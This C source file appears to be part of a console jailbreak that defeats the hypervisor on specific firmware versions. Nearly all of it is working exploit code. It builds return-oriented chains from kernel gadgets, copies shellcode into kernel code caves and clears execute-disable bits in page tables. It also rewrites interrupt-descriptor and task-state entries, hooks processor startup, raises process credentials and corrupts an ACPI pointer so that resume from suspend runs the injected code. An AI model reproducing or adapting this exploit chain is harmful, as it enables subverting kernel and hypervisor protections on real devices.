#include "hv_defeat_13xx.h"
#include "config.h"
#include "utils.h"
#include "prepare_resume.h"
#include "khook.h"
#include "../shellcode_ap/shellcode_ap.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <stdio.h>
#include <sys/mman.h>

#define IDT_SX          30
#define HOOK_CORE       0
#define HOOK_IST        6
#define DELIVERY_IST    7
#define TSS_STRIDE      0x68

#define CARRIER_PA          0x3FFFF000UL
#define CARRIER_PARAMS_OFF  0xF00UL

#define P_INIT_CB       0
#define P_DMAP          1
#define P_ORACLE        2
#define P_HV            3
#define P_HEAPOFF_ADDR  4
#define P_PCPUS_ADDR    5
#define P_MODE          6
#define P_HV_SIZE       30

#define HV_PCPUS_OFF    0x82A60UL
#define HV_HEAPOFF_OFF  0x83028UL

#define OFF_NVS_SIZETAB      0x1A1A030UL

static const uint64_t NVS_EXPECT[7] =
    { 0x2300, 0x200, 0x200, 0x0, 0x2000, 0x800, 0x1000 };

static int kh_read(uint64_t ka, void *dst, size_t len)  { kread(ka, dst, len); return 0; }
static int kh_write(uint64_t ka, const void *src, size_t len) {
  kwrite(ka, (void *)src, len);
  return 0;
}

static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
  struct gate_descriptor ip = {};
  ip.gd_looffset = func;
  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  ip.gd_ist = ist;
  ip.gd_xx = 0;
  ip.gd_type = typ;
  ip.gd_dpl = dpl;
  ip.gd_p = 1;
  ip.gd_hioffset = func >> 16;
  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip, sizeof(ip));
}

static uint64_t derive_H(void) {
  return derive_hv_base();
}

static void build_sx_rop(uint64_t ist, size_t shellcode_kernel_len, uint64_t oracle_va) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  (void)oracle_va;

  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC0115110ULL;
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 0x200ULL;
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;
  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC1010104ULL;
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 'S';
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;

  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = kernel_cave_shellcode;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = shellcode_kernel_len;
  *rop++ = ktext + env_offset.FUN_MEMCPY;

  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC1010104ULL;
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 'M';
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;

  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;

  kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

static void dump_pte_bits(const char *name, uint64_t va) {
  uint64_t table_phys = cr3;
  uint64_t entry = 0;
  int last = -1;

  notify("  %-26s va=0x%lx:", name, va);
  for (int level = 0; level < 4; level++) {
    int shift = 39 - (level * 9);
    uint64_t idx = (va >> shift) & 0x1FF;
    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;

    kread(entry_va, &entry, sizeof entry);
    notify(" L%d[P%d R%d X%d N%d S%d]", level, !!PAGE_P(entry), !!PAGE_RW(entry),
           !!PAGE_XO(entry), !!(entry & (1ULL << 63)), !!PAGE_PS(entry));
    last = level;
    if (!PAGE_P(entry) || ((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
      break;
    table_phys = PAGE_PA(entry);
  }
  notify("\n");
  fflush(stdout);
}

static void dump_text_perm(void) {
  notify("PTE STATE cr3=0x%lx dmap=0x%lx\n", cr3, dmap);
  notify("SWEEP BOUNDS ktext=0x%lx kdata=0x%lx -> loop runs? %s\n", ktext, kdata,
         (ktext < kdata) ? "YES" : "*** NO - remove_xotext DID NOTHING ***");
  fflush(stdout);

  dump_pte_bits("kernel_uart_override", ktext + env_offset.KERNEL_UART_OVERRIDE);
  dump_pte_bits("kernel_cfi_check", ktext + env_offset.KERNEL_CFI_CHECK);
  dump_pte_bits("KERNEL_CODE_CAVE", ktext + env_offset.KERNEL_CODE_CAVE);
  dump_pte_bits("GAD_ADD_RSP_28..RBP", ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET);
  dump_pte_bits("FUN_MEMCPY", ktext + env_offset.FUN_MEMCPY);
  dump_pte_bits("DATA_CAVE", ktext + env_offset.KERNEL_SYM_DATA_CAVE);

  dump_pte_bits("CARRIER_PA via dmap", dmap + CARRIER_PA);

  notify("VERDICT: leaf XO/RW printed per line above. X=1 or R=0 at the leaf means .text is\n"
         "VERDICT: still execute-only and shellcode_kernel's first write WILL fault.\n");
  fflush(stdout);
}

static void clear_execute_disable(const char *what, uint64_t va) {
  const uint64_t NX = 1ULL << 63;
  uint64_t table_phys = cr3;

  for (int level = 0; level < 4; level++) {
    int shift = 39 - (level * 9);
    uint64_t idx = (va >> shift) & 0x1FF;
    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;
    uint64_t entry;

    kread(entry_va, &entry, sizeof entry);
    if (!PAGE_P(entry)) {
      notify("NX %s: level %d not present, nothing to clear\n", what, level);
      return;
    }

    if (entry & NX) {
      entry &= ~NX;
      kwrite(entry_va, &entry, sizeof entry);
      notify("NX %s: CLEARED at level %d\n", what, level);
    }

    if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3) {
      notify("NX %s: done (leaf at level %d, PS=%d)\n", what, level, !!PAGE_PS(entry));
      return;
    }
    table_phys = PAGE_PA(entry);
  }
}

static int offsets_present(void) {
  const uint64_t need[] = {
    env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL,
    env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR,
    env_offset.KERNEL_SYM_DATA_CAVE,
    env_offset.GAD_PIVOT_ADD_RSP28_RET,
    env_offset.GAD_MOV_RAX_RDI_RET,
    env_offset.GAD_REP_MOVSB,
    env_offset.GAD_CLD_RET,
    env_offset.GAD_RET_TRAMP,
    env_offset.GAD_DBREG_RESUME,
    env_offset.GAD_POP_RAX_RET,
    env_offset.GAD_POP_RCX_RET,
    env_offset.GAD_POP_RDI_RET,
    env_offset.GAD_POP_RSI_RET,
    env_offset.GAD_POP_RDX_RET,
    env_offset.GAD_POP_RSP_RET,
    env_offset.IDT,
    env_offset.COMMON_TSS,
    env_offset.ACPIGBL_FACS,
    env_offset.FUN_MEMCPY,
    env_offset.KERNEL_CODE_CAVE,
  };

  const uint64_t need_rcx[] = {
    env_offset.GAD_POP_R8_RET,
    env_offset.GAD_STORE_RCX_R8_RET,
    env_offset.GAD_STORE_RDI8_RCX_RET,

    env_offset.GAD_SET_DR7_RAX,
    env_offset.GAD_ST_RCX_RDX_RET,
    env_offset.GAD_ST_RCX_RAX_RET,
    env_offset.GAD_MOV_RAX_RSI_RET,
  };

  const uint64_t need_rdi[] = {
    env_offset.GAD_STORE_RDI_RAX_RET,
    env_offset.GAD_OR_RSI_ECX_RET,
  };
  unsigned i;
  int have_rcx = 1, have_rdi = 1;

  for (i = 0; i < sizeof(need) / sizeof(need[0]); i++)
    if (!need[i])
      return 0;
  for (i = 0; i < sizeof(need_rcx) / sizeof(need_rcx[0]); i++)
    if (!need_rcx[i]) { have_rcx = 0; break; }
  for (i = 0; i < sizeof(need_rdi) / sizeof(need_rdi[0]); i++)
    if (!need_rdi[i]) { have_rdi = 0; break; }

  return have_rcx || have_rdi;
}

#include <fcntl.h>
static void trace_line(const char *fmt, ...) {
  char buf[256];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof buf, fmt, ap);
  va_end(ap);
  if (n < 0) return;
  if (n > (int)sizeof buf - 2) n = sizeof buf - 2;
  buf[n++] = '\n';

  static const char *const paths[] = {
    "/mnt/usb0/loader-1240-trace.txt",
    "/mnt/usb1/loader-1240-trace.txt",
    "/data/loader-1240-trace.txt",
  };
  for (unsigned i = 0; i < sizeof paths / sizeof paths[0]; i++) {
    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) continue;
    write(fd, buf, n);
    fsync(fd);
    close(fd);
  }
}

int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
  khook_t hook;
  kh_chain_t chain;
  static uint8_t chain_buf[0x800];

  uint64_t kh_cave, oracle_va, hv_base, ist_deliver;

  uint64_t carrier_pa = CARRIER_PA;
  int ret;

  trace_line("=== run === fw=0x%x", fw);
  notify("GATE fw=0x%x\n", fw);
  notify("GATE iommu=0x%lx facs=0x%lx idt=0x%lx tss=0x%lx mcpy=0x%lx\n",
         (unsigned long)env_offset.IOMMU_SOFTC, (unsigned long)env_offset.ACPIGBL_FACS,
         (unsigned long)env_offset.IDT, (unsigned long)env_offset.COMMON_TSS,
         (unsigned long)env_offset.FUN_MEMCPY);
  notify("GATE cave=0x%lx cfi=0x%lx hvx=0x%lx hvc=0x%lx nvs=0x%lx efi=0x%lx\n",
         (unsigned long)env_offset.KERNEL_CODE_CAVE, (unsigned long)env_offset.KERNEL_CFI_CHECK,
         (unsigned long)env_offset.HV_HANDLE_VMEXIT_PA, (unsigned long)env_offset.HV_CODE_CAVE_PA,
         (unsigned long)env_offset.NVS_SIZETAB, (unsigned long)env_offset.PRELOAD_METADATA);
  notify("GATE hook=0x%lx apvec=0x%lx dcave=0x%lx pivot=0x%lx\n",
         (unsigned long)env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL,
         (unsigned long)env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR,
         (unsigned long)env_offset.KERNEL_SYM_DATA_CAVE,
         (unsigned long)env_offset.GAD_PIVOT_ADD_RSP28_RET);
  notify("GATE rcxset: r8=0x%lx st_r8=0x%lx st_rax=0x%lx st_rdx=0x%lx dr7=0x%lx movsb=0x%lx\n",
         (unsigned long)env_offset.GAD_POP_R8_RET, (unsigned long)env_offset.GAD_STORE_RCX_R8_RET,
         (unsigned long)env_offset.GAD_ST_RCX_RAX_RET, (unsigned long)env_offset.GAD_ST_RCX_RDX_RET,
         (unsigned long)env_offset.GAD_SET_DR7_RAX, (unsigned long)env_offset.GAD_REP_MOVSB);

  if (!offsets_present()) {
    notify("GATE FAIL: offsets_present() rejected the table for fw=0x%x\n", fw);
    return -1;
  }
  trace_line("gate1 offsets_present OK");

  notify("GATE 1 ok: offsets_present\n");

  const uint64_t nvs_off = env_offset.NVS_SIZETAB ? env_offset.NVS_SIZETAB
                                                 : OFF_NVS_SIZETAB;
  for (int i = 0; i < 7; i++) {
    uint64_t got = kread64(ktext + nvs_off + (uint64_t)i * 8);
    if (got != NVS_EXPECT[i]) {
      notify("GATE FAIL: nvs[%d] at ktext+0x%lx is 0x%lx, expected 0x%lx\n",
             i, (unsigned long)(nvs_off + (uint64_t)i * 8), (unsigned long)got,
             (unsigned long)NVS_EXPECT[i]);
      return -1;
    }
  }
  trace_line("gate2 nvs signature OK");
  notify("GATE 2 ok: nvs signature\n");

  notify("DIAG: .text permission state (page tables only)\n");
  dump_text_perm();
  notify("DIAG done, continuing to arm\n");
  fflush(stdout);

  kh_cave   = ktext + env_offset.KERNEL_SYM_DATA_CAVE;
  oracle_va = kh_cave + KH_OFF_USER;

  if (fw == 0x1240 || fw == 0x1270 || fw == 0x1200 || fw == 0x1202 || fw == 0x1260 || fw == 0x1260 || fw == 0x1202) {
    trace_line("%s: skipping EFI walk (field absent on this fw)", fw == 0x1270 ? "12.70" : (fw == 0x1260 ? "12.60" : (fw == 0x1202 ? "12.02" : "12.40")));
    hv_base = 0;
  } else {
    trace_line("derive_H begin");
    hv_base = derive_H();
    trace_line("derive_H done H=0x%lx", (unsigned long)hv_base);
  }
  if (!hv_base && (fw == 0x1240 || fw == 0x1270 || fw == 0x1200 || fw == 0x1202 || fw == 0x1260 || fw == 0x1260 || fw == 0x1202)) {
    hv_base = HV_BASE_REGULAR;
    trace_line("gate3 H=0x%lx (constant, no read)", (unsigned long)hv_base);
    notify("%s: H = 0x%lx (constant, unvalidated)\n", fw == 0x1270 ? "12.70" : (fw == 0x1260 ? "12.60" : (fw == 0x1202 ? "12.02" : "12.40")), (unsigned long)hv_base);
  }
  if (!hv_base) {
    notify("GATE FAIL: H not derived (efi root read gave 0 or non-canonical)\n");
    return -1;
  }
  trace_line("gate3 H=0x%lx", (unsigned long)hv_base);
  notify("GATE 3 ok: H=0x%lx\n", (unsigned long)hv_base);

  notify("HPROBE: derived H = 0x%lx (expect 0x62800000; HV_HEAPOFF=+0x%lx PCPUS=+0x%lx)\n",
         (unsigned long)hv_base, (unsigned long)HV_HEAPOFF_OFF, (unsigned long)HV_PCPUS_OFF);

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  {
    int prc = pin_to_core_reborn(HOOK_CORE);

    notify("pin_to_core_reborn(%d) rc=%d (get_cpu reads %d)\n", HOOK_CORE, prc,
           sceKernelGetCurrentCpu());
    trace_line("pin_to_core rc=%d", prc);
    if (prc != 0) {
      notify("could not pin to core %d - refusing to arm.", HOOK_CORE);
      return -1;
    }
  }

  {
    int nonzero = 0;
    for (uint64_t off = 0; off < 0x4000; off += 8) {
      if (kread64(kh_cave + off)) { nonzero++; }
    }
    if (nonzero) {
      notify("data cave at 0x%lx is NOT empty (%d non-zero qwords in 0x4000) - refusing to arm.\n"
             "That page is in use by the kernel; khook would corrupt it.",
             (unsigned long)kh_cave, nonzero);
      return -1;
    }
  }

  kwrite(kh_cave + 0x1000, shellcode_ap_bin, shellcode_ap_bin_len);

  ret = kh_init(&hook, kh_read, kh_write, ktext, kh_cave, HOOK_IST);
  if (ret)
    return -1;

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, ktext + env_offset.IDT, ktext + env_offset.COMMON_TSS);
  kh_set_core(&hook, HOOK_CORE);

  hook.oneshot = env_offset.GAD_SET_DR7_RAX ? 1 : 0;

  kh_set_hook_target(&hook, ktext + env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL);
  kh_set_resume_rsi(&hook, dmap + carrier_pa);
  kh_set_resume_rdx(&hook, cr3);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle_va, 0);

  kh_chain_memcpy(&chain, dmap + carrier_pa, kh_cave + 0x1000, 0xF00);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_INIT_CB * 8,
                 ktext + env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_DMAP * 8, dmap);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_ORACLE * 8, oracle_va);

  uint64_t hv_code_base = hv_base;
  if (fw == 0x1360 && sceKernelGetMainSocId() == SOC_ID_PS5_PRO)
    hv_code_base += HV_CODE_OFFSET_PRO;
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HV * 8, hv_base);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HEAPOFF_ADDR * 8,
                 hv_code_base + HV_HEAPOFF_OFF);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_PCPUS_ADDR * 8,
                 hv_code_base + HV_PCPUS_OFF);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_MODE * 8, 1);

  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HV_SIZE * 8,
                 g_hv_carveout_size ? g_hv_carveout_size : 0x2029000ULL);

  trace_line("carrier XD clear begin");
  clear_execute_disable("carrier page", dmap + carrier_pa);
  trace_line("carrier XD cleared");

  trace_line("kh_install begin");
  ret = kh_install(&hook, &chain);
  if (ret) {
    trace_line("kh_install FAILED rc=%d", ret);
    notify("khook install failed (%d) - refusing to suspend.", ret);
    return -1;
  }

  trace_line("kh_install ok; kh_trigger begin");
  kh_trigger(&hook);
  trace_line("kh_trigger returned - ARMED");

  ist_deliver = pa_to_dmap(alloc_page());
  build_sx_rop(ist_deliver, shellcode_kernel_len, oracle_va);
  kwrite64(ktext + env_offset.COMMON_TSS + offsetof(struct amd64tss, tss_ist7),
           ist_deliver + 0x1000);
  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT, SEL_KPL,
         DELIVERY_IST);
  setidt(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT, SEL_KPL,
         DELIVERY_IST);

  {
    uint64_t facs_va = ktext + env_offset.ACPIGBL_FACS;
    uint64_t before = kread64(facs_va);

    uint64_t facs_sentinel = facs_va - 8;
    kwrite64(facs_va, facs_sentinel);
    uint64_t after = kread64(facs_va);

    notify("FACS TRIGGER: va=0x%lx before=0x%lx wrote=0x%lx readback=0x%lx %s\n",
           facs_va, before, facs_sentinel, after,
           (after == facs_sentinel) ? "OK (non-canonical -> #GP at resume)" : "*** WRITE DID NOT STICK ***");
    fflush(stdout);
  }

  return 0;
}
